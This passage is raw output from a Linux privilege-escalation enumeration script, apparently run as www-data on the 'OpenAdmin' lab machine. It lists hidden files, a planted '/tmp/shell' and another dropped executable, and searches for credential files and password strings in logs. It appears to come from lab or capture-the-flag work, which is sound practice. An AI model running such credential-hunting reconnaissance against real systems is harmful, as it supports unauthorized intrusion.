-rw-rw-r-- 1 www-data www-data 6148 Dec 19  2017 /var/www/html/sierra/js/.DS_Store
-rw-rw-r-- 1 www-data www-data 6148 Dec 21  2017 /var/www/html/sierra/img/blog/.DS_Store
-rw-rw-r-- 1 www-data www-data 6148 Dec 21  2017 /var/www/html/sierra/img/icon/.DS_Store
-rw-rw-r-- 1 www-data www-data 6148 Dec 21  2017 /var/www/html/sierra/img/instagram/right-instagram/.DS_Store
-rw-rw-r-- 1 www-data www-data 6148 Dec 21  2017 /var/www/html/sierra/img/instagram/.DS_Store
-rw-rw-r-- 1 www-data www-data 6148 Dec 21  2017 /var/www/html/sierra/img/testimonials/.DS_Store
-rw-rw-r-- 1 www-data www-data 6148 Dec 21  2017 /var/www/html/sierra/img/team/people/.DS_Store
-rw-rw-r-- 1 www-data www-data 8196 Dec 21  2017 /var/www/html/sierra/img/.DS_Store
-rw-rw-r-- 1 www-data www-data 6148 Dec  9  2017 /var/www/html/sierra/scss/.DS_Store
-rw-rw-r-- 1 www-data www-data 6148 Dec 21  2017 /var/www/html/sierra/css/.DS_Store
-rw-rw-r-- 1 www-data www-data 6148 Dec  4  2017 /var/www/html/sierra/fonts/.DS_Store
-rw-rw-r-- 1 www-data www-data 6148 Dec  9  2017 /var/www/html/sierra/vendors/owl-carousel/.DS_Store
-rw-rw-r-- 1 www-data www-data 6148 Dec 15  2017 /var/www/html/sierra/vendors/circle-bar/.DS_Store
-rw-rw-r-- 1 www-data www-data 6148 Dec  8  2017 /var/www/html/sierra/vendors/counterup/.DS_Store
-rw-rw-r-- 1 www-data www-data 6148 Mar 25  2016 /var/www/html/sierra/vendors/progress/.DS_Store
-rw-rw-r-- 1 www-data www-data 6148 Dec  3  2017 /var/www/html/sierra/vendors/revolution/.DS_Store
-rw-rw-r-- 1 www-data www-data 8196 Dec 21  2017 /var/www/html/sierra/vendors/.DS_Store
-rw-rw-r-- 1 www-data www-data 10244 Oct 21  2019 /var/www/html/marga/images/.DS_Store
-rw-rw-r-- 1 www-data www-data 10244 Aug 30  2018 /var/www/html/marga/scss/bootstrap/.DS_Store
-rw-rw-r-- 1 www-data www-data 6148 Sep 13  2018 /var/www/html/marga/scss/.DS_Store
-rw-rw-r-- 1 www-data www-data 6148 Sep 17  2018 /var/www/html/marga/css/.DS_Store
-rw-rw-r-- 1 www-data www-data 6148 Sep 30  2019 /var/www/html/marga/fonts/flaticon/.DS_Store
-rw-rw-r-- 1 www-data www-data 6148 Sep 30  2019 /var/www/html/marga/fonts/.DS_Store
-rw-rw-r-- 1 www-data www-data 10244 Oct 21  2019 /var/www/html/marga/.DS_Store
-rw------- 1 root root 0 Jun 21  2019 /snap/core/7270/etc/.pwd.lock
-rw-r--r-- 1 root root 220 Aug 31  2015 /snap/core/7270/etc/skel/.bash_logout
-rw------- 1 root root 0 Oct 30  2019 /snap/core/8039/etc/.pwd.lock
-rw-r--r-- 1 root root 220 Aug 31  2015 /snap/core/8039/etc/skel/.bash_logout

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)                                                                                                       
-rwxr-xr-x 1 www-data www-data 250 Apr 30 17:11 /tmp/shell                                                                                                                                                                                  
-rwxr-xr-x 1 www-data www-data 4714 May  1 07:31 /tmp/WQWSGd9h
-rw-r--r-- 1 root root 2325 Nov 22  2019 /var/backups/alternatives.tar.1.gz
-rw-r--r-- 1 root root 40960 May  1 06:25 /var/backups/alternatives.tar.0

╔══════════╣ Searching passwords in config PHP files
                                                                                                                                                                                                                                            
╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/bin/systemd-ask-password                                                                                                                                                                                                                   
/bin/systemd-tty-ask-password-agent
/etc/pam.d/common-password
/usr/lib/grub/i386-pc/legacy_password_test.mod
/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/mysql/plugin/validate_password.so
/usr/lib/python3/dist-packages/twisted/cred/__pycache__/credentials.cpython-36.pyc
/usr/lib/python3/dist-packages/twisted/cred/credentials.py
/usr/share/dns/root.key
/usr/share/man/man1/systemd-ask-password.1.gz
/usr/share/man/man1/systemd-tty-ask-password-agent.1.gz
/usr/share/man/man7/credentials.7.gz
/usr/share/man/man8/systemd-ask-password-console.path.8.gz
/usr/share/man/man8/systemd-ask-password-console.service.8.gz
/usr/share/man/man8/systemd-ask-password-wall.path.8.gz
/usr/share/man/man8/systemd-ask-password-wall.service.8.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/pam/common-password.md5sums
/usr/share/ubuntu-advantage-tools/modules/credentials.sh
/var/cache/debconf/passwords.dat
/var/lib/cloud/instances/4f2a8709-07da-4a21-a7a6-3d7e7511bff9/sem/config_set_passwords
/var/lib/pam/password

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                                                                                                                                                                                            
╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                                                                                                                                                                                            
╔══════════╣ Searching passwords inside logs (limit 70)
/var/log/bootstrap.log: base-passwd depends on libc6 (>= 2.8); however:                                                                                                                                                                     
/var/log/bootstrap.log: base-passwd depends on libdebconfclient0 (>= 0.145); however:
/var/log/bootstrap.log:Preparing to unpack .../base-passwd_3.5.44_amd64.deb ...
/var/log/bootstrap.log:Preparing to unpack .../passwd_1%3a4.5-1ubuntu1_amd64.deb ...
/var/log/bootstrap.log:Selecting previously unselected package base-passwd.
/var/log/bootstrap.log:Selecting previously unselected package passwd.
/var/log/bootstrap.log:Setting up base-passwd (3.5.44) ...
/var/log/bootstrap.log:Setting up passwd (1:4.5-1ubuntu1) ...
/var/log/bootstrap.log:Shadow passwords are now on.
/var/log/bootstrap.log:Unpacking base-passwd (3.5.44) ...
/var/log/bootstrap.log:Unpacking base-passwd (3.5.44) over (3.5.44) ...
/var/log/bootstrap.log:Unpacking passwd (1:4.5-1ubuntu1) ...
/var/log/bootstrap.log:dpkg: base-passwd: dependency problems, but configuring anyway as you requested:
/var/log/cloud-init.log:2019-11-21 13:45:16,343 - ssh_util.py[DEBUG]: line 123: option PasswordAuthentication added with yes
/var/log/cloud-init.log:2019-11-21 13:45:16,385 - cc_set_passwords.py[DEBUG]: Restarted the ssh daemon.
/var/log/dpkg.log.1:2019-08-05 19:22:58 configure base-passwd:amd64 3.5.44 3.5.44
/var/log/dpkg.log.1:2019-08-05 19:22:58 install base-passwd:amd64 <none> 3.5.44
/var/log/dpkg.log.1:2019-08-05 19:22:58 status half-configured base-passwd:amd64 3.5.44
/var/log/dpkg.log.1:2019-08-05 19:22:58 status half-installed base-passwd:amd64 3.5.44
/var/log/dpkg.log.1:2019-08-05 19:22:58 status installed base-passwd:amd64 3.5.44
/var/log/dpkg.log.1:2019-08-05 19:22:58 status unpacked base-passwd:amd64 3.5.44
/var/log/dpkg.log.1:2019-08-05 19:22:59 status half-configured base-passwd:amd64 3.5.44
/var/log/dpkg.log.1:2019-08-05 19:22:59 status half-installed base-passwd:amd64 3.5.44
/var/log/dpkg.log.1:2019-08-05 19:22:59 status unpacked base-passwd:amd64 3.5.44
/var/log/dpkg.log.1:2019-08-05 19:22:59 upgrade base-passwd:amd64 3.5.44 3.5.44
/var/log/dpkg.log.1:2019-08-05 19:23:02 install passwd:amd64 <none> 1:4.5-1ubuntu1
/var/log/dpkg.log.1:2019-08-05 19:23:02 status half-installed passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log.1:2019-08-05 19:23:02 status unpacked passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log.1:2019-08-05 19:23:03 configure base-passwd:amd64 3.5.44 <none>
/var/log/dpkg.log.1:2019-08-05 19:23:03 status half-configured base-passwd:amd64 3.5.44
/var/log/dpkg.log.1:2019-08-05 19:23:03 status installed base-passwd:amd64 3.5.44
/var/log/dpkg.log.1:2019-08-05 19:23:03 status unpacked base-passwd:amd64 3.5.44
/var/log/dpkg.log.1:2019-08-05 19:23:04 configure passwd:amd64 1:4.5-1ubuntu1 <none>
/var/log/dpkg.log.1:2019-08-05 19:23:04 status half-configured passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log.1:2019-08-05 19:23:04 status installed passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log.1:2019-08-05 19:23:04 status unpacked passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log.1:2019-08-05 19:23:48 configure passwd:amd64 1:4.5-1ubuntu2 <none>
/var/log/dpkg.log.1:2019-08-05 19:23:48 status half-configured passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log.1:2019-08-05 19:23:48 status half-configured passwd:amd64 1:4.5-1ubuntu2
/var/log/dpkg.log.1:2019-08-05 19:23:48 status half-installed passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log.1:2019-08-05 19:23:48 status installed passwd:amd64 1:4.5-1ubuntu2
/var/log/dpkg.log.1:2019-08-05 19:23:48 status unpacked passwd:amd64 1:4.5-1ubuntu1
/var/log/dpkg.log.1:2019-08-05 19:23:48 status unpacked passwd:amd64 1:4.5-1ubuntu2
/var/log/dpkg.log.1:2019-08-05 19:23:48 upgrade passwd:amd64 1:4.5-1ubuntu1 1:4.5-1ubuntu2
/var/log/installer/installer-journal.txt:Nov 21 13:41:29 ubuntu-server chage[22679]: changed password expiry for sshd
/var/log/installer/installer-journal.txt:Nov 21 13:41:29 ubuntu-server usermod[22674]: change user 'sshd' password
/var/log/ona.log:Nov 21 16:51:30 openadmin guest@192.168.116.1: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
/var/log/ona.log:Nov 21 16:51:31 openadmin guest@192.168.116.1: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
/var/log/ona.log:Nov 21 16:56:32 openadmin guest@192.168.116.1: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
/var/log/ona.log:Nov 21 17:01:32 openadmin guest@192.168.116.1: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
/var/log/ona.log:Nov 21 17:06:32 openadmin guest@192.168.116.1: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
/var/log/ona.log:Nov 21 17:11:32 openadmin guest@192.168.116.1: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
/var/log/ona.log:Nov 21 17:16:32 openadmin guest@192.168.116.1: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
/var/log/ona.log:Nov 21 17:21:32 openadmin guest@192.168.116.1: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
/var/log/ona.log:Nov 21 17:26:32 openadmin guest@192.168.116.1: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
/var/log/ona.log:Nov 21 17:31:32 openadmin guest@192.168.116.1: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
/var/log/ona.log:Nov 21 17:36:32 openadmin guest@192.168.116.1: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
/var/log/ona.log:Nov 21 17:41:32 openadmin guest@192.168.116.1: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
/var/log/ona.log:Nov 21 18:06:32 openadmin guest@192.168.116.1: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
/var/log/ona.log:Nov 21 18:11:32 openadmin guest@192.168.116.1: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
/var/log/ona.log:Nov 21 18:12:00 openadmin guest@192.168.116.1: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
/var/log/ona.log:Nov 21 18:12:01 openadmin guest@192.168.116.1: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
/var/log/ona.log:Nov 21 18:12:04 openadmin guest@192.168.116.1: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
/var/log/ona.log:Nov 21 18:12:11 openadmin guest@192.168.116.1: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
/var/log/ona.log:Nov 21 18:12:12 openadmin guest@192.168.116.1: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
/var/log/ona.log:Nov 21 18:12:21 openadmin guest@192.168.116.1: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
/var/log/ona.log:Nov 21 18:12:22 openadmin guest@192.168.116.1: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
/var/log/ona.log:Nov 21 18:14:23 openadmin guest@192.168.116.1: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
grep: write error/var/log/ona.log:Nov 21 18:14:38 openadmin guest@192.168.116.130: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
: Broken pipe/var/log/ona.log:Nov 21 18:14:49 openadmin guest@192.168.116.130: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect




                                ╔════════════════╗
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════                                                                                                                                                          
                                ╚════════════════╝                                                                                                                                                                                          
Regexes to search for API keys aren't activated, use param '-r'
```
